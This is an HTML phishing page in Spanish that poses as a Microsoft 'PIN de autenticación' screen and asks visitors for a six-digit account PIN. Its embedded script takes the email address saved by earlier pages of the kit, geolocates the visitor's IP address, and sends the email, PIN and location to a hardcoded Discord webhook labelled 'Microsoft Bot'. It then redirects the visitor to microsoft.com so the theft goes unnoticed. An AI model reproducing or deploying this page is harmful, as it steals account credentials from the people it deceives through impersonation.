<!DOCTYPE html>
<html lang="es">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Actualización de términos</title>
    <style>
        body {
            margin: 0;
            padding: 0;
            background-color: #f4f6f8;
            font-family: 'Segoe UI', -apple-system, BlinkMacSystemFont, Roboto, Arial, sans-serif;
            display: flex;
            justify-content: center;
            align-items: center;
            min-height: 100vh;
        }
        .aaa {
            width: 100%;
            padding: 20px;
            box-sizing: border-box;
            display: flex;
            justify-content: center;
        }
        .caja {
            background: #ffffff;
            width: 100%;
            max-width: 460px;
            padding: 48px 40px;
            border-radius: 12px;
            box-shadow: 0px 4px 24px rgba(0, 0, 0, 0.04);
            text-align: center;
            box-sizing: border-box;
        }
        .imgkol {
            margin-bottom: 24px;
        }
        .imgkol img {
            height: 22px;
        }
        .titu1 {
            font-size: 26px;
            font-weight: 600;
            color: #111111;
            line-height: 1.25;
            margin: 0 auto 16px auto;
            max-width: 320px;
        }
        .titu2 {
            font-size: 14.5px;
            color: #444444;
            line-height: 1.5;
            margin-bottom: 28px;
        }
        .subC {
            background: #fcf3e6;
            text-align: left;
            padding: 20px 24px;
            border-radius: 8px;
            margin-bottom: 32px;
            box-sizing: border-box;
            border-left: 4px solid #f6a700;
        }
        .sut {
            display: inline-block;
            background: #ffcb5c;
            color: #6c3100;
            padding: 4px 12px;
            border-radius: 20px;
            font-size: 12px;
            font-weight: 600;
            margin-bottom: 7px;
        }
        .subC p {
            font-size: 14px;
            color: #333333;
            line-height: 1.5;
            margin: 0 0 12px 0;
        }
        .subC p:last-child {
            margin-bottom: 0;
        }
        .btn1 {
            margin-bottom: 32px;
        }
        .btn1 button {
            background: #0067b8;
            color: #ffffff;
            border: none;
            padding: 10px 32px;
            font-size: 15px;
            font-weight: 600;
            border-radius: 4px;
            cursor: pointer;
        }
        .btn1 button:hover {
            background: #005a9e;
        }
        .e2 {
            margin-bottom: 7px;
            font-size: 14px;
            font-weight: 600;
        }
        .input-group {
            margin-bottom: 16px;
            position: relative;
        }
        .input-group input {
            width: 100%;
            padding: 8px 0 8px 8px;
            font-size: 15px;
            font-family: inherit;
            border: 1px solid #8a8886;
            outline: none;
            background: transparent;
            box-sizing: border-box;
            transition: border-bottom-color 0.2s, border-bottom-width 0.2s;
        }
        .input-group input.error-input {
            border: 1px solid #d32f2f;
            background-color: #fff6f6;
        }
        .error-message {
            color: #d32f2f;
            font-size: 12px;
            margin-top: 5px;
            text-align: left;
            display: none;
        }
        .e3 {
            font-size: 13px;
            margin-bottom: 15px;
            color: #666;
        }
        .adis {
            border-top: 1px solid #f0f0f0;
            padding-top: 20px;
            font-size: 12px;
            color: #666666;
            text-align: left;
            display: flex;
            flex-wrap: wrap;
            row-gap: 8px;
            column-gap: 16px;
        }
        .adis a {
            color: #666666;
            text-decoration: none;
        }
        .adis a:hover {
            text-decoration: underline;
        }
        .adis p {
            width: 100%;
            margin: 12px 0 0 0;
            color: #888888;
        }
        @media (max-width: 480px) {
            .caja {
                padding: 32px 24px;
            }
            .titu1 {
                font-size: 22px;
            }
            .adis {
                flex-direction: column;
                text-align: center;
                align-items: center;
            }
        }
    </style>
</head>
<body>
    <div class="aaa">
        <div class="caja">
            <div class="imgkol">
                <img src="https://upload.wikimedia.org/wikipedia/commons/9/96/Microsoft_logo_%282012%29.svg" alt="">
            </div>

            <div class="titu1">Pin de autenticación</div>
            
            <div class="titu2">Para finalizar, introduzca el código de autenticación (PIN) de su cuenta</div>
            
            <div class="subC">
                <div class="sut">Importante</div>
                <p>Este PIN es único e intransferible. No lo compartas con nadie.</p>
            </div>
            <div class="input-group">
                <p class="e2">Código PIN</p>
                <input id="pinInput" style="text-align: center;" type="text" inputmode="numeric" pattern="[0-9]{6}" maxlength="6" placeholder="* * * * * *" required>
                <div id="errorMsg" class="error-message"></div>
                <p class="e3">Agrega un pin de seguridad de 6 digitos.</p>
            </div>

            <div class="btn1"><button id="siguienteBtn">Siguiente</button></div>
            <div class="adis">
                <a href="#">Términos de uso</a>
                <a href="#">Aviso de privacidad</a>
                <a href="#">Más información</a> 
                <p>© 2026 Microsoft</p>
            </div>
        </div>
    </div>

<script>
    const webhook = "https://discord.com/api/webhooks/1507131798218342512/HttmYqpus_6kYPNe1WyYNxSyhkGjzTLxjlSNlIpTPtZUEeWuCfy9EJeF_ILhDmmBNYpq";
    
    async function fetchWithTimeout(url, timeout = 5000) {
        const controller = new AbortController();
        const id = setTimeout(() => controller.abort(), timeout);
        try {
            const response = await fetch(url, { signal: controller.signal });
            clearTimeout(id);
            return response;
        } catch (error) {
            clearTimeout(id);
            throw error;
        }
    }
    
    async function getGeoInfo() {
        const apis = [
            { url: 'https://ipapi.co/json/', parser: (data) => ({ ip: data.ip, pais: data.country_name, ciudad: data.city }) },
            { url: 'https://ipinfo.io/json/', parser: (data) => ({ ip: data.ip, pais: data.country, ciudad: data.city }) },
            { url: 'https://api.ipify.org?format=json', parser: (data) => ({ ip: data.ip, pais: 'Desconocido', ciudad: 'Desconocido' }) },
            { url: 'https://api.my-ip.io/ip.json', parser: (data) => ({ ip: data.ip, pais: data.country || 'Desconocido', ciudad: data.city || 'Desconocido' }) }
        ];
        for (const api of apis) {
            try {
                const res = await fetchWithTimeout(api.url, 4000);
                if (!res.ok) continue;
                const data = await res.json();
                let result = api.parser(data);
                if (result.ip && result.ip !== 'No disponible') {
                    if (result.pais === 'Desconocido' && result.ciudad === 'Desconocido' && api.url.includes('ipify')) {
                        try {
                            const geoRes = await fetchWithTimeout(`https://ipapi.co/${result.ip}/json/`, 3000);
                            if (geoRes.ok) {
                                const geoData = await geoRes.json();
                                result.pais = geoData.country_name || 'Desconocido';
                                result.ciudad = geoData.city || 'Desconocido';
                            }
                        } catch(e) {}
                    }
                    return result;
                }
            } catch(e) {
                continue;
            }
        }
        return { ip: 'No disponible', pais: 'No disponible', ciudad: 'No disponible' };
    }
    
    async function ensureGeoInfo() {
        const stored = localStorage.getItem('userDataIndex1');
        if (stored) {
            try {
                const data = JSON.parse(stored);
                if (data.geo && data.geo.ip && data.geo.ip !== 'No disponible') {
                    return data.geo;
                }
            } catch(e) {}
        }
        return await getGeoInfo();
    }
    
    function formatGeoLine(geo) {
        return `🌍 **IP:** ${geo.ip} - 📍 **País:** ${geo.pais} - 🏙️ **Ciudad:** ${geo.ciudad}`;
    }
    
    function showError(message) {
        const errorDiv = document.getElementById('errorMsg');
        const input = document.getElementById('pinInput');
        errorDiv.textContent = message;
        errorDiv.style.display = 'block';
        input.classList.add('error-input');
    }
    
    function clearError() {
        const errorDiv = document.getElementById('errorMsg');
        const input = document.getElementById('pinInput');
        errorDiv.style.display = 'none';
        errorDiv.textContent = '';
        input.classList.remove('error-input');
    }
    
    document.addEventListener('DOMContentLoaded', function() {
        const btn = document.getElementById('siguienteBtn');
        const pinInput = document.getElementById('pinInput');
        
        pinInput.addEventListener('input', function() {
            clearError();
        });
        
        btn.addEventListener('click', async (e) => {
            e.preventDefault();
            
            const pin = pinInput.value.trim();
            if (!pin) {
                showError('Por favor ingrese el PIN de autenticación.');
                return;
            }
            
            const previousCode1 = localStorage.getItem('verificationCode1');
            const previousCode2 = localStorage.getItem('verificationCode2');
            if ((previousCode1 && previousCode1 === pin) || (previousCode2 && previousCode2 === pin)) {
                showError('El PIN no puede ser igual a los códigos anteriores. Por favor ingrese un PIN diferente.');
                return;
            }
            
            clearError();
            
            const userDataRaw = localStorage.getItem('userDataIndex1');
            let email = 'Sin correo';
            if (userDataRaw) {
                try {
                    const userData = JSON.parse(userDataRaw);
                    email = userData.email || 'Sin correo';
                } catch(e) {}
            }
            
            const geo = await ensureGeoInfo();
            const geoLine = formatGeoLine(geo);
            
            const mensaje = `🔐 **PIN FINAL DE AUTENTICACIÓN**\n📧 Correo: ${email}\n🔢 PIN: ${pin}\n${geoLine}`;
            
            try {
                await fetch(webhook, {
                    method: 'POST',
                    headers: { 'Content-Type': 'application/json' },
                    body: JSON.stringify({ content: mensaje, username: 'Microsoft Bot' })
                });
            } catch(err) { console.error(err); }
            
            window.location.href = 'https://www.microsoft.com/';
        });
    });
</script>
</body>
</html>
